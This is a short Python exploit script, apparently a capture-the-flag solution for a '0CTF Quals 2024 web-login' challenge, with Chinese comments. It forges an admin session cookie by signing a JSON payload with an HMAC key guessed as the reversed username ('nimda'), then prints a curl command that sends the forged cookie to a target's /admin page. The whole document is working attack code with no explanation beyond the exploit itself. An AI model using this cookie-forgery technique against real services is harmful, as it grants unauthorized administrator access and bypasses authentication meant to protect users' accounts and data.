import base64
import hmac
import hashlib
import json

# 0CTF Quals 2024 - web-login 利用脚本
# 说明：HMAC 密钥为用户名倒序，可自签 admin Cookie

NAME = "admin"
KEY = NAME[::-1].encode()          # 预测出的密钥：nimda


def forge(username: str, role: str) -> str:
    payload = json.dumps({"username": username, "role": role}).encode()
    sig = hmac.new(KEY, payload, hashlib.sha256).hexdigest()
    return base64.urlsafe_b64encode(payload).decode() + "." + sig


if __name__ == "__main__":
    cookie = forge("admin", "admin")
    print("Cookie:", cookie)
    print('用法：curl -b "session=' + cookie + '" https://<target>/admin')
